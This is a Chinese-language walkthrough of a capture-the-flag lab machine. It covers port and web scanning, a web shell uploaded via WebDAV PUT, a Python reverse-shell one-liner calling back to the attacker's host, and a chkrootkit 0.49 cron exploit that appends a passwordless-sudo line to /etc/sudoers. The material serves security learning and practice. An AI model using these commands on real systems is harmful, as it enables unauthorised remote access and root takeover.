# 信息搜集

1、主机存活探测

```bash
└─# nmap -sn 192.168.0.0/24 --min-rate 1000
```

2、端口信息探测，就 22 和 80 端口

```bash
└─# nmap -sVC -O  -A -p- 192.168.0.105
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 668cc0f2857c6cc0f6ab7d480481c2d4 (DSA)
|   2048 ba86f5eecc83dfa63ffdc134bb7e62ab (RSA)
|_  256 a16cfa18da571d332c52e4ec97e29eaf (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:0A:4A:07 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3、80 端口简单探测，发现web  `/test/` 上下文

```bash
└─# nikto -host 192.168.0.105
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.0.105
+ Target Hostname:    192.168.0.105
+ Target Port:        80
+ Start Time:         2023-06-22 04:40:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /test/: Directory indexing found.
+ /test/: This might be interesting.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2023-06-22 04:41:14 (GMT-4) (32 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

4、80端口查看网站，发现一张图片，图片文字如下，可参悟其隐藏的道理

```http
what if computer viruses are really made by the anti-virus softare companies to make money.
```

<img src=".\图片\Snipaste_2023-06-22_16-44-05.png" alt="Snipaste_2023-06-22_16-44-05" style="zoom:80%;" />

下载图片后，用 strings 查看图片里有无关键字符串，暂时没发现重要信息

```bash
┌──(root💀kali)-[~/sickos]
└─# wget http://192.168.0.105/blow.jpg
--2023-06-22 04:45:52--  http://192.168.0.105/blow.jpg
Connecting to 192.168.0.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46878 (46K) [image/jpeg]
Saving to: ‘blow.jpg’

blow.jpg                                100%[=============================================================================>]  45.78K  --.-KB/s    in 0s      

2023-06-22 04:45:52 (105 MB/s) - ‘blow.jpg’ saved [46878/46878]

                                                                                                             ┌──(root💀kali)-[~/sickos]
└─# ls
blow.jpg
                                                                                                              ┌──(root💀kali)-[~/sickos]
└─# strings blow.jpg 
```

5、目录扫描，也暂时无法现

```bash
└─# gobuster dir -u http://192.168.0.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  

└─# gobuster dir -u http://192.168.0.105/test -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
```

# web打点

1、查看访问  `http://192.168.0.105/test/`  里的请求与响应包的信息

发现其允许接受很多不同的请求方式

```bash
└─# curl -X OPTIONS http://192.168.0.105/test -vv                                                 
*   Trying 192.168.0.105:80...
* Connected to 192.168.0.105 (192.168.0.105) port 80 (#0)
> OPTIONS /test HTTP/1.1
> Host: 192.168.0.105
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Location: http://192.168.0.105/test/
< Content-Length: 0
< Date: Thu, 22 Jun 2023 08:55:04 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.0.105 left intact
```

2、burp 更换请求方式，POST、PUT 等

尝试上传一句话木马

<img src=".\图片\Snipaste_2023-06-22_17-00-05.png" alt="Snipaste_2023-06-22_17-00-05" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-06-22_17-00-44.png" alt="Snipaste_2023-06-22_17-00-44" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-06-22_17-00-53.png" alt="Snipaste_2023-06-22_17-00-53" style="zoom:80%;" />

3、执行反弹 shell，443端口可以，好像其它端口不太行

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.103",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

```bash
└─# nc -lvnp 443                                                                                                                                          1 ⨯
listening on [any] 443 ...
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.105] 53889
$ export TERM=xterm
export TERM=xterm
/bin/sh: 2: cl: not found
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 提权

1、查找计划任务

```bash
$ ls -alh /etc/*cron*
ls -alh /etc/*cron*
-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab

ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72K
drwxr-xr-x  2 root root 4.0K Apr 12  2016 .
drwxr-xr-x 84 root root 4.0K Jun 22  2023 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  16K Nov 15  2013 apt
-rwxr-xr-x  1 root root  314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root  502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root 2.0K Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root  256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root  338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root  372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root 1.4K Dec 28  2012 man-db
-rwxr-xr-x  1 root root  606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root  249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root 2.4K Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root 2.9K Jun 19  2012 standard

/etc/cron.hourly:
total 12K
drwxr-xr-x  2 root root 4.0K Mar 30  2016 .
drwxr-xr-x 84 root root 4.0K Jun 22  2023 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.monthly:
total 12K
drwxr-xr-x  2 root root 4.0K Mar 30  2016 .
drwxr-xr-x 84 root root 4.0K Jun 22  2023 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.weekly:
total 20K
drwxr-xr-x  2 root root 4.0K Mar 30  2016 .
drwxr-xr-x 84 root root 4.0K Jun 22  2023 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index
-rwxr-xr-x  1 root root  907 Dec 28  2012 man-db
```

发现 `chkrootkit` 程序，顾名思义她是检测 rootkit 后门的，结合之前 80 端口图片里的文字含义，思考一下，有没有可能 `chkrootkit` 本身就是后门之类的呢？

并且搜索下版本

```bash
$ chkrootkit -V
chkrootkit -V
chkrootkit version 0.49
```

2、搜索 chkrootkit 本身有无已知漏洞

```bash
└─# searchsploit chkrootkit 0.49
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                        | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                | linux/local/33899.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
└─# cat 33899.txt 
We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

#
# SLAPPER.{A,B,C,D} and the multi-platform variant
#
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}">
/dev/null 2>&1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] && file_port=`netstat -p ${OPT} | \
         $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print  $7 }' |
tr -d :`
   fi
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ ${STATUS} -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "${QUIET}" != "t" ]; then echo "not infected"; fi
         return ${NOT_INFECTED}
   fi
}


The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.


Suggested fix: Put quotation marks around the assignment.

file_port="$file_port $i"


I will also try to contact upstream, although the latest version of
chkrootkit dates back to 2009 - will have to see, if I reach a dev there.   
```

猜测利用，就是在 /tmp 目录下创建一个名 update 文件，她会定期以 root 身份运行

3、修改 `/etc/sudoers` 文件提权

```bash
echo "echo 'www-data ALL=NOPASSWD: ALL' >> /etc/sudoers" > update
echo "echo end.....ok > /tmp/ok" >> update
chmod +x update
```

4、sudo su

```bash
$ sudo -l
sudo -l
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (root) NOPASSWD: ALL
$ sudo su
sudo su
root@ubuntu:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

# 总结

可以使用 `curl -X OPTIONS http://192.168.0.105/test -vv` 查看网站请求与响应信息，可以查看到是否允许其它格式的访问，比如 POST、PUT 等

PUT 格式请求访问，靶场这里可以创建文件

对于 `/etc/sudoers`  sudo组的玩法，可以加入一些用户使其拥有所有的 sudo 权限，前提是当前用户可以根据一些其它的命令或程序有权限来修改  sudoers 程序


